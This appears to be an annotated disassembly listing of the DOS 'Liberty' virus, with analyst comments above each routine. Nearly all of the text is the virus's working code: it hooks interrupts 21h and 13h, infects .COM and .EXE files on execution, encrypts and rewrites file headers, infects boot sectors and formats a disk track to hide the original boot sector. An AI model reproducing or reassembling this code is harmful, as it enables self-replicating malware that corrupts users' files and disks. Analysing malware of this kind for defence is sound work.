CS:0110 EB79          JMP 018B
CS:0112 90            NOP                                    
;
; The program's original infomation is stored between these sections
;
CS:018B 2E            CS: 
CS:018C 803E090201    CMP BYTE PTR [0209],01     ; .EXE file ?
CS:0191 7403          JZ 0196                               
CS:0193 1F            POP DS                                 
CS:0194 59            POP CX                                 
CS:0195 5B            POP BX                                 
CS:0196 50            PUSH AX                                 
CS:0197 53            PUSH BX                                 
CS:0198 51            PUSH CX                                 
CS:0199 52            PUSH DX                                 
CS:019A 1E            PUSH DS                                 
CS:019B 06            PUSH ES                                 
CS:019C 1E            PUSH DS                                 
CS:019D 0E            PUSH CS                                 
CS:019E 1F            POP DS                                 
CS:019F E8CD00        CALL 026F                  ; Installation check
CS:01A2 3DFFFF        CMP AX,FFFF                            
CS:01A5 741A          JZ 01C1                               
CS:01A7 E8D700        CALL 0281                  ; Get vector 21h
CS:01AA 07            POP ES                                 
CS:01AB 06            PUSH ES                                 
CS:01AC 8CC0          MOV AX,ES                              
CS:01AE 48            DEC AX                                 
CS:01AF 8ED8          MOV DS,AX                              
CS:01B1 E8DC00        CALL 0290                  ; Adjust MCB
CS:01B4 8EC0          MOV ES,AX                              
CS:01B6 0E            PUSH CS                                 
CS:01B7 1F            POP DS                                 
CS:01B8 E8EC00        CALL 02A7                  ; Move to Upper Memory
CS:01BB E8F400        CALL 02B2                  ; Set vector 21h
CS:01BE E80101        CALL 02C2                  ; Set installation flag
CS:01C1 2E            CS:                                    
CS:01C2 803E090201    CMP BYTE PTR [0209],01     ; .EXE file ?
CS:01C7 7417          JZ 01E0                               
CS:01C9 07            POP ES                                 
CS:01CA 0E            PUSH CS                                 
CS:01CB 1F            POP DS                                 
CS:01CC E80901        CALL 02D8                  ; Decrypt header
CS:01CF E81901        CALL 02EB                  ; Restore header
CS:01D2 07            POP ES                                 
CS:01D3 1F            POP DS                                 
CS:01D4 5A            POP DX                                 
CS:01D5 59            POP CX                                 
CS:01D6 5B            POP BX                                 
CS:01D7 58            POP AX                                 
CS:01D8 1E            PUSH DS                                 
CS:01D9 BF0001        MOV DI,0100                            
CS:01DC 57            PUSH DI                                 
CS:01DD 33FF          XOR DI,DI                              
CS:01DF CB            RETF                       ; Start file
CS:01E0 FA            CLI                                    
CS:01E1 5E            POP SI                                 
CS:01E2 07            POP ES                                 
CS:01E3 1F            POP DS                                 
CS:01E4 5A            POP DX                                 
CS:01E5 59            POP CX                                 
CS:01E6 5B            POP BX                                 
CS:01E7 58            POP AX                                 
CS:01E8 2E            CS:                                    
CS:01E9 8B3E2C06      MOV DI,[062C]                          
CS:01ED 03FE          ADD DI,SI                              
CS:01EF 8ED7          MOV SS,DI                              
CS:01F1 2E            CS:                                    
CS:01F2 8B3E2E06      MOV DI,[062E]                          
CS:01F6 8BE7          MOV SP,DI                  ; Restore stack
CS:01F8 2E            CS:                                    
CS:01F9 8B3E2806      MOV DI,[0628]                          
CS:01FD 03FE          ADD DI,SI                              
CS:01FF 57            PUSH DI                                 
CS:0200 2E            CS:                                    
CS:0201 FF362A06      PUSH [062A]                             
CS:0205 33F6          XOR SI,SI                              
CS:0207 EBD4          JMP 01DD                   ; Start file
;
; The encrypted Liberty header for .COM files
;
DS:0200                                1D 69 D9 00 01 01
DS:0210  80 80 40 40 20 20 10 10-08 08 A4 05 D2 04 C9 02
DS:0220  4C 81 A8 40 49 20 21 90-0B 48 E8 69 95 05 4A 92
DS:0230  21 1D 40 A8 43 28 90 14-4E 4C 07 27 D3 22 81 81
DS:0240  C0 B0 40 C4 79 20 90 29-5C D0 AE 69 57 35 2B 9A
DS:0250  31 CD 34 40 51 53 AE 5D-62 C0 E3 C1 B0 35 58 F6
DS:0260  46 E5 20 02
;
; Various subroutines used by the virus
;
CS:026F 2E            CS: 
CS:0270 8A1E6A02      MOV BL,[026A]                          
CS:0274 32FF          XOR BH,BH                              
CS:0276 33C0          XOR AX,AX                              
CS:0278 8ED8          MOV DS,AX                              
CS:027A D1E3          SHL BX,1                               
CS:027C D1E3          SHL BX,1                               
CS:027E 8B07          MOV AX,[BX]                            
CS:0280 C3            RET                                    
CS:0281 A18400        MOV AX,[0084]                          
CS:0284 2E            CS:                                    
CS:0285 A38C03        MOV [038C],AX                          
CS:0288 A18600        MOV AX,[0086]                          
CS:028B 2E            CS:                                    
CS:028C A38E03        MOV [038E],AX                          
CS:028F C3            RET                                    
CS:0290 BB4221        MOV BX,2142                            
CS:0293 B104          MOV CL,04                              
CS:0295 D3EB          SHR BX,CL                              
CS:0297 291E0300      SUB [0003],BX                          
CS:029B A10300        MOV AX,[0003]                          
CS:029E 03060100      ADD AX,[0001]                          
CS:02A2 A31200        MOV [0012],AX                          
CS:02A5 40            INC AX                                 
CS:02A6 C3            RET                                    
CS:02A7 BF1001        MOV DI,0110                            
CS:02AA 8BF7          MOV SI,DI                              
CS:02AC B99A05        MOV CX,059A                            
CS:02AF F3            REPZ                                    
CS:02B0 A5            MOVSW                                    
CS:02B1 C3            RET                                    
CS:02B2 33C0          XOR AX,AX                              
CS:02B4 8ED8          MOV DS,AX                              
CS:02B6 FA            CLI                                    
CS:02B7 B86C03        MOV AX,036C                            
CS:02BA A38400        MOV [0084],AX                          
CS:02BD 8C068600      MOV [0086],ES                          
CS:02C1 C3            RET                                    
CS:02C2 FA            CLI                                    
CS:02C3 B8FFFF        MOV AX,FFFF                            
CS:02C6 2E            CS:                                    
CS:02C7 8A1E6A02      MOV BL,[026A]                          
CS:02CB 32FF          XOR BH,BH                              
CS:02CD D1E3          SHL BX,1                               
CS:02CF D1E3          SHL BX,1                               
CS:02D1 8907          MOV [BX],AX                            
CS:02D3 40            INC AX                                 
CS:02D4 894702        MOV [BX+02],AX                         
CS:02D7 C3            RET                                    
CS:02D8 B93C00        MOV CX,003C                            
CS:02DB BE1301        MOV SI,0113                            
CS:02DE 2E            CS:                                    
CS:02DF 8B14          MOV DX,[SI]                            
CS:02E1 D3CA          ROR DX,CL                              
CS:02E3 2E            CS:                                    
CS:02E4 8914          MOV [SI],DX                            
CS:02E6 46            INC SI                                 
CS:02E7 46            INC SI                                 
CS:02E8 E2F4          LOOP 02DE                               
CS:02EA C3            RET                                    
CS:02EB BF0001        MOV DI,0100                            
CS:02EE BE1301        MOV SI,0113                            
CS:02F1 B93C00        MOV CX,003C                            
CS:02F4 F3            REPZ                                    
CS:02F5 A5            MOVSW                                    
CS:02F6 C3            RET
;
; I am not sure what the next routine is supposed to be doing.
;
CS:02F7 9C            PUSHF                                    
CS:02F8 2E            CS:                                    
CS:02F9 803E100301    CMP BYTE PTR [0310],01                 
CS:02FE 740A          JZ 030A                               
CS:0300 80FC03        CMP AH,03                              
CS:0303 7505          JNZ 030A                               
CS:0305 80FA80        CMP DL,80                              
CS:0308 7207          JB 0311                               
CS:030A 9D            POPF                                    
CS:030B EA00000000    JMP 0000:0000
CS:0311 06            PUSH ES
CS:0312 0E            PUSH CS
CS:0313 07            POP ES
CS:0314 B80902        MOV AX,0209                            
CS:0317 BB420C        MOV BX,0C42                            
CS:031A B90100        MOV CX,0001                            
CS:031D 9C            PUSHF                                    
CS:031E 2E            CS:                                    
CS:031F FF1E0C03      CALL FAR [030C]                         
CS:0323 72E5          JB 030A                               
CS:0325 B80905        MOV AX,0509                            
CS:0328 BB4803        MOV BX,0348                            
CS:032B B93100        MOV CX,0031                            
CS:032E 9C            PUSHF                                    
CS:032F 2E            CS:                                    
CS:0330 FF1E0C03      CALL FAR [030C]                         
CS:0334 72D4          JB 030A                               
CS:0336 B80903        MOV AX,0309                            
CS:0339 BB420C        MOV BX,0C42                            
CS:033C B93100        MOV CX,0031                            
CS:033F 9C            PUSHF                                    
CS:0340 2E            CS:                                    
CS:0341 FF1E0C03      CALL FAR [030C]                         
CS:0345 07            POP ES                                 
CS:0346 9D            POPF                                    
CS:0347 CF            IRET                                    
;
; Another format table used by the virus
;
DS:0340                          00 00 31 02 00 00 32 02
DS:0350  00 00 33 02 00 00 34 02-00 00 35 02 00 00 36 02
DS:0360  00 00 37 02 00 00 38 02-00 00 39 02
;
; The virus infects files by monitoring function 4Bh of vector 21h
;
CS:036C 9C            PUSHF 
CS:036D 3D004B        CMP AX,4B00                ; Execute function ?
CS:0370 741E          JZ 0390                               
CS:0372 EB16          JMP 038A                               
CS:0374 90            NOP                                    
CS:0375 E8B901        CALL 0531                  ; Close file
CS:0378 E89A00        CALL 0415                  ; Restore vectors
CS:037B C6060C04FF    MOV BYTE PTR [040C],FF                 
CS:0380 90            NOP                                    
CS:0381 9D            POPF                                    
CS:0382 07            POP ES                                 
CS:0383 1F            POP DS                                 
CS:0384 5F            POP DI                                 
CS:0385 5E            POP SI                                 
CS:0386 5A            POP DX                                 
CS:0387 59            POP CX                                 
CS:0388 5B            POP BX                                 
CS:0389 58            POP AX                                 
CS:038A 9D            POPF                                    
CS:038B EA77142C02    JMP 022C:1477              ; Continue
CS:0390 50            PUSH AX                                 
CS:0391 53            PUSH BX                                 
CS:0392 51            PUSH CX                                 
CS:0393 52            PUSH DX                                 
CS:0394 56            PUSH SI                                 
CS:0395 57            PUSH DI                                 
CS:0396 1E            PUSH DS                                 
CS:0397 06            PUSH ES                                 
CS:0398 9C            PUSHF                                    
CS:0399 E8A600        CALL 0442                  ; Set error vectors
CS:039C E8E100        CALL 0480                  ; Open file
CS:039F 72D4          JB 0375                               
CS:03A1 0E            PUSH CS                                 
CS:03A2 1F            POP DS                                 
CS:03A3 0E            PUSH CS                                 
CS:03A4 07            POP ES                                 
CS:03A5 A30A04        MOV [040A],AX                          
CS:03A8 93            XCHG BX,AX                              
CS:03A9 C6060C0401    MOV BYTE PTR [040C],01                 
CS:03AE 90            NOP                                    
CS:03AF E8D800        CALL 048A                  ; Read file header
CS:03B2 72C1          JB 0375                               
CS:03B4 BB1301        MOV BX,0113                            
CS:03B7 2E            CS:                                    
CS:03B8 813F4D5A      CMP WORD PTR [BX],5A4D     ; .EXE file ?
CS:03BC 7505          JNZ 03C3                               
CS:03BE E8C001        CALL 0581                  ; Adapt header
CS:03C1 EBB2          JMP 0375                               
CS:03C3 2E            CS:                                    
CS:03C4 C606090200    MOV BYTE PTR [0209],00     ; Set switch
CS:03C9 E8CD00        CALL 0499                  ; Check infection
CS:03CC 74A7          JZ 0375                               
CS:03CE E8DD00        CALL 04AE                  ; Encrypt header
CS:03D1 E8EB00        CALL 04BF                  ; Move to EOF
CS:03D4 729F          JB 0375                               
CS:03D6 83FA00        CMP DX,+00                 ;
CS:03D9 759A          JNZ 0375                   ;
CS:03DB 3D0005        CMP AX,0500                ;
CS:03DE 7295          JB 0375                    ;
CS:03E0 3DFFEF        CMP AX,EFFF                ;
CS:03E3 7390          JNB 0375                   ; Check file size
CS:03E5 E8EA00        CALL 04D2                  ; Move to next paragraph
CS:03E8 728B          JB 0375                               
CS:03EA E80701        CALL 04F4                  ; Write virus
CS:03ED 7286          JB 0375                               
CS:03EF 3BC1          CMP AX,CX                              
CS:03F1 7C11          JL 0404                               
CS:03F3 E81301        CALL 0509                  ; Move to BOF
CS:03F6 7209          JB 0401                               
CS:03F8 E86201        CALL 055D                  ; Decrypt Libery header
CS:03FB E81E01        CALL 051C                  ; Write Liberty header
CS:03FE E86F01        CALL 0570                  ; Encrypt Liberty Header
CS:0401 E971FF        JMP 0375                               
CS:0404 E83801        CALL 053F                  ; Set & get vector 13h
CS:0407 E96BFF        JMP 0375                   
;
; Revectoring of error vectors.
;
CS:0415 1E            PUSH DS                                 
CS:0416 33DB          XOR BX,BX                              
CS:0418 8EDB          MOV DS,BX                              
CS:041A FA            CLI                                    
CS:041B 2E            CS:                                    
CS:041C 8B1E0D04      MOV BX,[040D]                          
CS:0420 891E8C00      MOV [008C],BX                          
CS:0424 2E            CS:                                    
CS:0425 8B1E0F04      MOV BX,[040F]                          
CS:0429 891E8E00      MOV [008E],BX                          
CS:042D FA            CLI                                    
CS:042E 2E            CS:                                    
CS:042F 8B1E1104      MOV BX,[0411]                          
CS:0433 891E9000      MOV [0090],BX                          
CS:0437 2E            CS:                                    
CS:0438 8B1E1304      MOV BX,[0413]                          
CS:043C 891E8E00      MOV [008E],BX                          
CS:0440 1F            POP DS                                 
CS:0441 C3            RET                                    
CS:0442 1E            PUSH DS                                 
CS:0443 33DB          XOR BX,BX                              
CS:0445 8EDB          MOV DS,BX                              
CS:0447 8B1E8C00      MOV BX,[008C]                          
CS:044B 2E            CS:                                    
CS:044C 891E0D04      MOV [040D],BX                          
CS:0450 8B1E8E00      MOV BX,[008E]                          
CS:0454 2E            CS:                                    
CS:0455 891E0F04      MOV [040F],BX                          
CS:0459 FA            CLI                                    
CS:045A BB3106        MOV BX,0631                            
CS:045D 891E8C00      MOV [008C],BX                          
CS:0461 8C0E8E00      MOV [008E],CS                          
CS:0465 8B1E9000      MOV BX,[0090]                          
CS:0469 2E            CS:                                    
CS:046A 891E1104      MOV [0411],BX                          
CS:046E 8B1E9200      MOV BX,[0092]                          
CS:0472 FA            CLI                                    
CS:0473 BB3206        MOV BX,0632                            
CS:0476 891E9000      MOV [0090],BX                          
CS:047A 8C0E9200      MOV [0092],CS                          
CS:047E 1F            POP DS                                 
CS:047F C3            RET
;
; Various subroutines used by the virus
;
CS:0480 B8023D        MOV AX,3D02                            
CS:0483 9C            PUSHF                                    
CS:0484 2E            CS:                                    
CS:0485 FF1E8C03      CALL FAR [038C]                         
CS:0489 C3            RET                                    
CS:048A B43F          MOV AH,3F                              
CS:048C B97800        MOV CX,0078                            
CS:048F BA1301        MOV DX,0113                            
CS:0492 9C            PUSHF                                    
CS:0493 2E            CS:                                    
CS:0494 FF1E8C03      CALL FAR [038C]                         
CS:0498 C3            RET                                    
CS:0499 BF1301        MOV DI,0113                            
CS:049C 81C76802      ADD DI,0268                            
CS:04A0 81EF0A02      SUB DI,020A                            
CS:04A4 BE6802        MOV SI,0268                            
CS:04A7 FC            CLD                                    
CS:04A8 B90700        MOV CX,0007                            
CS:04AB F3            REPZ                                    
CS:04AC A6            CMPSB                                    
CS:04AD C3            RET                                    
CS:04AE B93C00        MOV CX,003C                            
CS:04B1 BE1301        MOV SI,0113                            
CS:04B4 8B14          MOV DX,[SI]                            
CS:04B6 D3C2          ROL DX,CL                              
CS:04B8 8914          MOV [SI],DX                            
CS:04BA 46            INC SI                                 
CS:04BB 46            INC SI                                 
CS:04BC E2F6          LOOP 04B4                               
CS:04BE C3            RET
CS:04BF B80242        MOV AX,4202                            
CS:04C2 2E            CS:                                    
CS:04C3 8B1E0A04      MOV BX,[040A]                          
CS:04C7 33C9          XOR CX,CX                              
CS:04C9 33D2          XOR DX,DX                              
CS:04CB 9C            PUSHF                                    
CS:04CC 2E            CS:                                    
CS:04CD FF1E8C03      CALL FAR [038C]                         
CS:04D1 C3            RET                                    
CS:04D2 B90400        MOV CX,0004                            
CS:04D5 D3E8          SHR AX,CL                              
CS:04D7 BB6602        MOV BX,0266                            
CS:04DA 8907          MOV [BX],AX                            
CS:04DC 40            INC AX                                 
CS:04DD B90400        MOV CX,0004                            
CS:04E0 D3E0          SHL AX,CL                              
CS:04E2 92            XCHG DX,AX                              
CS:04E3 33C9          XOR CX,CX                              
CS:04E5 B80042        MOV AX,4200                            
CS:04E8 2E            CS:                                    
CS:04E9 8B1E0A04      MOV BX,[040A]                          
CS:04ED 9C            PUSHF                                    
CS:04EE 2E            CS:                                    
CS:04EF FF1E8C03      CALL FAR [038C]                         
CS:04F3 C3            RET                                    
CS:04F4 B9330B        MOV CX,0B33                            
CS:04F7 B80040        MOV AX,4000                            
CS:04FA BA1001        MOV DX,0110                            
CS:04FD 2E            CS:                                    
CS:04FE 8B1E0A04      MOV BX,[040A]                          
CS:0502 9C            PUSHF                                    
CS:0503 2E            CS:                                    
CS:0504 FF1E8C03      CALL FAR [038C]                         
CS:0508 C3            RET                                    
CS:0509 B80042        MOV AX,4200                            
CS:050C 2E            CS:                                    
CS:050D 8B1E0A04      MOV BX,[040A]                          
CS:0511 33C9          XOR CX,CX                              
CS:0513 33D2          XOR DX,DX                              
CS:0515 9C            PUSHF                                    
CS:0516 2E            CS:                                    
CS:0517 FF1E8C03      CALL FAR [038C]                         
CS:051B C3            RET                                    
CS:051C BA0A02        MOV DX,020A                            
CS:051F B80040        MOV AX,4000                            
CS:0522 2E            CS:                                    
CS:0523 8B1E0A04      MOV BX,[040A]                          
CS:0527 B97800        MOV CX,0078                            
CS:052A 9C            PUSHF                                    
CS:052B 2E            CS:                                    
CS:052C FF1E8C03      CALL FAR [038C]                         
CS:0530 C3            RET                                    
CS:0531 B43E          MOV AH,3E                              
CS:0533 2E            CS:                                    
CS:0534 8B1E0A04      MOV BX,[040A]                          
CS:0538 9C            PUSHF                                    
CS:0539 2E            CS:                                    
CS:053A FF1E8C03      CALL FAR [038C]                         
CS:053E C3            RET                                    
CS:053F 33C0          XOR AX,AX                              
CS:0541 8ED8          MOV DS,AX                              
CS:0543 FA            CLI                                    
CS:0544 A14C00        MOV AX,[004C]                          
CS:0547 2E            CS:                                    
CS:0548 A31407        MOV [0714],AX                          
CS:054B A14E00        MOV AX,[004E]                          
CS:054E 2E            CS:                                    
CS:054F A31607        MOV [0716],AX                          
CS:0552 B8F906        MOV AX,06F9                            
CS:0555 A34C00        MOV [004C],AX                          
CS:0558 8C0E4E00      MOV [004E],CS                          
CS:055C C3            RET
;
; Header encrypting
;
CS:055D B92D00        MOV CX,002D                            
CS:0560 BE0A02        MOV SI,020A                            
CS:0563 2E            CS:                                    
CS:0564 8B3C          MOV DI,[SI]                            
CS:0566 D3CF          ROR DI,CL                              
CS:0568 2E            CS:                                    
CS:0569 893C          MOV [SI],DI                            
CS:056B 46            INC SI                                 
CS:056C 46            INC SI                                 
CS:056D E2F4          LOOP 0563                               
CS:056F C3            RET                                    
CS:0570 BE0A02        MOV SI,020A                            
CS:0573 B92D00        MOV CX,002D                            
CS:0576 8B3C          MOV DI,[SI]                            
CS:0578 D3C7          ROL DI,CL                              
CS:057A 893C          MOV [SI],DI                            
CS:057C 46            INC SI                                 
CS:057D 46            INC SI                                 
CS:057E E2F6          LOOP 0576                               
CS:0580 C3            RET
;
; .EXE file handling
;
CS:0581 8B7F02        MOV DI,[BX+02]                         
CS:0584 83FFFF        CMP DI,-01                 ; Check infection
CS:0587 7439          JZ 05C2                               
CS:0589 8B7F16        MOV DI,[BX+16]                         
CS:058C 83C710        ADD DI,+10                             
CS:058F 893E2806      MOV [0628],DI                          
CS:0593 8B7F14        MOV DI,[BX+14]                         
CS:0596 893E2A06      MOV [062A],DI                          
CS:059A 8B7F0E        MOV DI,[BX+0E]                         
CS:059D 83C710        ADD DI,+10                             
CS:05A0 893E2C06      MOV [062C],DI                          
CS:05A4 8B7F10        MOV DI,[BX+10]                         
CS:05A7 893E2E06      MOV [062E],DI                          
CS:05AB BF1001        MOV DI,0110                            
CS:05AE 897F14        MOV [BX+14],DI             ; Set IP
CS:05B1 BF420D        MOV DI,0D42                            
CS:05B4 897F10        MOV [BX+10],DI             ; Set SP
CS:05B7 2E            CS:                                    
CS:05B8 C606090201    MOV BYTE PTR [0209],01     ; Set switch
CS:05BD E8FFFE        CALL 04BF                  ; Move to EOF
CS:05C0 7301          JNB 05C3                               
CS:05C2 C3            RET                                    
CS:05C3 83FA0A        CMP DX,+0A                 ;
CS:05C6 77FA          JA 05C2                    ; Check file size
CS:05C8 B104          MOV CL,04                              
CS:05CA D3E8          SHR AX,CL                              
CS:05CC 40            INC AX                                 
CS:05CD 3D0010        CMP AX,1000                            
CS:05D0 7501          JNZ 05D3                               
CS:05D2 42            INC DX                                 
CS:05D3 D3E0          SHL AX,CL                              
CS:05D5 50            PUSH AX                                 
CS:05D6 52            PUSH DX                                 
CS:05D7 B91000        MOV CX,0010                            
CS:05DA F7F1          DIV CX                                 
CS:05DC BB1301        MOV BX,0113                            
CS:05DF 2D1100        SUB AX,0011                            
CS:05E2 8B7F08        MOV DI,[BX+08]                         
CS:05E5 2BC7          SUB AX,DI                              
CS:05E7 894716        MOV [BX+16],AX             ; Set CodeSegment
CS:05EA 89470E        MOV [BX+0E],AX             ; Set StackSegment
CS:05ED 59            POP CX                                 
CS:05EE 5A            POP DX                                 
CS:05EF E8F3FE        CALL 04E5                  ; Move to next paragraph
CS:05F2 722F          JB 0623                               
CS:05F4 E8FDFE        CALL 04F4                  ; Write virus
CS:05F7 722A          JB 0623                               
CS:05F9 3BC1          CMP AX,CX                              
CS:05FB 7C27          JL 0624                               
CS:05FD E8BFFE        CALL 04BF                  ; Move to BOF
CS:0600 7221          JB 0623                               
CS:0602 B90002        MOV CX,0200                            
CS:0605 F7F1          DIV CX                                 
CS:0607 83FA00        CMP DX,+00                             
CS:060A 7401          JZ 060D                               
CS:060C 40            INC AX                                 
CS:060D BB1301        MOV BX,0113                            
CS:0610 894704        MOV [BX+04],AX             ; Set blocks
CS:0613 C74702FFFF    MOV WORD PTR [BX+02],FFFF  ; Set infection mark
CS:0618 E8EEFE        CALL 0509                  ; Move to BOF
CS:061B 7206          JB 0623                               
CS:061D BA1301        MOV DX,0113
CS:0620 E8FCFE        CALL 051F                  ; Write header
CS:0623 C3            RET                                    
CS:0624 E818FF        CALL 053F                  ; Set & get vector 13h
CS:0627 C3            RET                                    
;
; Error vectors
;
CS:0631 CF            IRET                       ; Error vector 23h
CS:0632 32C0          XOR AL,AL                  ;
CS:0634 CF            IRET                       ; Error vector 24h
;
; The next part is the virus's bootsector
;
CS:0635 EB01          JMP 0638                               
CS:0637 90            NOP                                    
CS:0638 33C0          XOR AX,AX                              
CS:063A 8ED0          MOV SS,AX                              
CS:063C BC007C        MOV SP,7C00                            
CS:063F 33C0          XOR AX,AX                              
CS:0641 8EC0          MOV ES,AX                              
CS:0643 BB1304        MOV BX,0413                ;
CS:0646 26            ES:                        ;
CS:0647 8B07          MOV AX,[BX]                ;
CS:0649 2D0A00        SUB AX,000A                ;
CS:064C B106          MOV CL,06                  ;
CS:064E 26            ES:                        ;
CS:064F 8907          MOV [BX],AX                ; Decrease memory
CS:0651 D3E0          SHL AX,CL
CS:0653 8EC0          MOV ES,AX
CS:0655 B80802        MOV AX,0208                ;
CS:0658 BB1001        MOV BX,0110                ;
CS:065B B93128        MOV CX,2831                ;
CS:065E 33D2          XOR DX,DX                  ;
CS:0660 CD13          INT 13                     ; Read virus
CS:0662 06            PUSH ES                                 
CS:0663 BB6806        MOV BX,0668                            
CS:0666 53            PUSH BX                                 
CS:0667 CB            RETF                                    
CS:0668 2E            CS:                                    
CS:0669 803EC8060A    CMP BYTE PTR [06C8],0A                 
CS:066E 7446          JZ 06B6                               
CS:0670 33C0          XOR AX,AX                              
CS:0672 8ED8          MOV DS,AX                              
CS:0674 2E            CS:                                    
CS:0675 FE06C806      INC BYTE PTR [06C8]                    
CS:0679 B80803        MOV AX,0308                            
CS:067C BB1001        MOV BX,0110                            
CS:067F B93128        MOV CX,2831                            
CS:0682 33D2          XOR DX,DX                              
CS:0684 CD13          INT 13                                 
CS:0686 E85200        CALL 06DB                  ; Set & get vector 13h
CS:0689 2E            CS:                        ;
CS:068A C606470BFF    MOV BYTE PTR [0B47],FF     ;
CS:068F 90            NOP                        ;
CS:0690 2E            CS:                        ;
CS:0691 C606950BFF    MOV BYTE PTR [0B95],FF     ;
CS:0696 90            NOP                        ;
CS:0697 2E            CS:                        ;
CS:0698 C606080CFF    MOV BYTE PTR [0C08],FF     ; Switches off
CS:069D 90            NOP                                    
CS:069E E82902        CALL 08CA                  ; Set & get vector 8h
CS:06A1 E85402        CALL 08F8                  ; Set & get vector 1Ch
CS:06A4 E84104        CALL 0AE8                  ; Set & get vector 10h
CS:06A7 E85804        CALL 0B02                  ; Set & get vector 14h
CS:06AA E86F04        CALL 0B1C                  ; Set & get vector 17h
CS:06AD E81900        CALL 06C9                  ; Read original bootsector
CS:06B0 BB007C        MOV BX,7C00                ;
CS:06B3 1E            PUSH DS                    ;
CS:06B4 53            PUSH BX                    ;
CS:06B5 CB            RETF                       ; Start
CS:06B6 E81000        CALL 06C9                  ; Read bootsector
CS:06B9 B80103        MOV AX,0301                            
CS:06BC BB007C        MOV BX,7C00                            
CS:06BF B90100        MOV CX,0001                            
CS:06C2 33D2          XOR DX,DX                              
CS:06C4 CD13          INT 13                                 
CS:06C6 EBE5          JMP 06AD                               
CS:06C9 33C0          XOR AX,AX
CS:06CB 8EC0          MOV ES,AX                              
CS:06CD B80102        MOV AX,0201                            
CS:06D0 BB007C        MOV BX,7C00                            
CS:06D3 B93F28        MOV CX,283F                            
CS:06D6 33D2          XOR DX,DX                              
CS:06D8 CD13          INT 13                                 
CS:06DA C3            RET                                    
CS:06DB 33C0          XOR AX,AX                              
CS:06DD 8ED8          MOV DS,AX                              
CS:06DF A14C00        MOV AX,[004C]                          
CS:06E2 2E            CS:                                    
CS:06E3 A31608        MOV [0816],AX                          
CS:06E6 A14E00        MOV AX,[004E]                          
CS:06E9 2E            CS:                                    
CS:06EA A31808        MOV [0818],AX                          
CS:06ED FA            CLI                                    
CS:06EE B8FB07        MOV AX,07FB                            
CS:06F1 A34C00        MOV [004C],AX                          
CS:06F4 8C0E4E00      MOV [004E],CS                          
CS:06F8 C3            RET
;
; Boot sectors are infected via vector 13h
;
CS:06F9 9C            PUSHF                                    
CS:06FA 80FC01        CMP AH,01                              
CS:06FD 7E13          JLE 0712                               
CS:06FF 80FC04        CMP AH,04                              
CS:0702 7D0E          JGE 0712                               
CS:0704 80FA80        CMP DL,80                              
CS:0707 720F          JB 0718                               
CS:0709 E8BE00        CALL 07CA                  ; Disconnect vector 13h
CS:070C 07            POP ES                                 
CS:070D 1F            POP DS                                 
CS:070E 5A            POP DX                                 
CS:070F 59            POP CX                                 
CS:0710 5B            POP BX                                 
CS:0711 58            POP AX                                 
CS:0712 9D            POPF                                    
CS:0713 EA00000000    JMP 0000:0000                          
CS:0718 50            PUSH AX                                 
CS:0719 53            PUSH BX                                 
CS:071A 51            PUSH CX                                 
CS:071B 52            PUSH DX                                 
CS:071C 1E            PUSH DS                                 
CS:071D 06            PUSH ES                                 
CS:071E B80102        MOV AX,0201                ;
CS:0721 0E            PUSH CS                    ;
CS:0722 07            POP ES                     ;
CS:0723 0E            PUSH CS                    ;
CS:0724 1F            POP DS                     ;
CS:0725 BB420C        MOV BX,0C42                ;
CS:0728 B90100        MOV CX,0001                ;
CS:072B 32F6          XOR DH,DH                  ;
CS:072D 9C            PUSHF                      ;
CS:072E 2E            CS:                        ;
CS:072F FF1E1407      CALL FAR [0714]            ; Read Bootsector
CS:0733 72D4          JB 0709                               
CS:0735 0E            PUSH CS                                 
CS:0736 1F            POP DS                                 
CS:0737 0E            PUSH CS                                 
CS:0738 07            POP ES                                 
CS:0739 BE420C        MOV SI,0C42                ;
CS:073C BF3506        MOV DI,0635                ;
CS:073F B90A00        MOV CX,000A                ;
CS:0742 FC            CLD                        ;
CS:0743 F3            REPZ                       ;
CS:0744 A7            CMPSW                      ; Check infection
CS:0745 74C2          JZ 0709                               
CS:0747 BE420C        MOV SI,0C42                            
CS:074A 807C02FF      CMP BYTE PTR [SI+02],FF    ; Was infected ?
CS:074E 744A          JZ 079A                               
CS:0750 B0FF          MOV AL,FF                              
CS:0752 884402        MOV [SI+02],AL                         
CS:0755 B80905        MOV AX,0509                ;
CS:0758 BBA607        MOV BX,07A6                ;
CS:075B B93128        MOV CX,2831                ;
CS:075E 9C            PUSHF                      ;
CS:075F 2E            CS:                        ;
CS:0760 FF1E1407      CALL FAR [0714]            ; Format track 40
CS:0764 72A3          JB 0709                               
CS:0766 B80103        MOV AX,0301                ;
CS:0769 BB420C        MOV BX,0C42                ;
CS:076C B93F28        MOV CX,283F                ;
CS:076F 9C            PUSHF                      ;
CS:0770 2E            CS:                        ;
CS:0771 FF1E1407      CALL FAR [0714]            ; Write original bootsector
CS:0775 7292          JB 0709                               
CS:0777 B80103        MOV AX,0301                ;
CS:077A BB3506        MOV BX,0635                ;
CS:077D B90100        MOV CX,0001                ;
CS:0780 9C            PUSHF                      ;
CS:0781 2E            CS:                        ;
CS:0782 FF1E1407      CALL FAR [0714]            ; Write Libery bootsector
CS:0786 7281          JB 0709                               
CS:0788 B80803        MOV AX,0308                ;
CS:078B BB1001        MOV BX,0110                ;
CS:078E B93128        MOV CX,2831                ;
CS:0791 9C            PUSHF                      ;
CS:0792 2E            CS:                        ;
CS:0793 FF1E1407      CALL FAR [0714]            ; Write Liberty virus
CS:0797 E96FFF        JMP 0709                               
CS:079A 2E            CS:                        ;
CS:079B C606100300    MOV BYTE PTR [0310],00     ;
CS:07A0 E83B00        CALL 07DE                  ; Attach ???
CS:07A3 E963FF        JMP 0709                               
;
; The format table is next
;
DS:07A0                    28 00-31 02 28 00 32 02 28 00
DS:07B0  33 02 28 00 34 02 28 00-35 02 28 00 36 02 28 00
DS:07C0  37 02 28 00 38 02 28 00-3F 02
;
; Revectoring
;
CS:07CA 33C0          XOR AX,AX
CS:07CC 8ED8          MOV DS,AX                              
CS:07CE FA            CLI                                    
CS:07CF 2E            CS:                                    
CS:07D0 A11407        MOV AX,[0714]                          
CS:07D3 A34C00        MOV [004C],AX                          
CS:07D6 2E            CS:                                    
CS:07D7 A11607        MOV AX,[0716]                          
CS:07DA A34E00        MOV [004E],AX                          
CS:07DD C3            RET                                    
CS:07DE 2E            CS:                                    
CS:07DF A11407        MOV AX,[0714]                          
CS:07E2 2E            CS:                                    
CS:07E3 A30C03        MOV [030C],AX                          
CS:07E6 2E            CS:                                    
CS:07E7 A11607        MOV AX,[0716]                          
CS:07EA 2E            CS:                                    
CS:07EB A30E03        MOV [030E],AX                          
CS:07EE B8F702        MOV AX,02F7                            
CS:07F1 2E            CS:                                    
CS:07F2 A31407        MOV [0714],AX                          
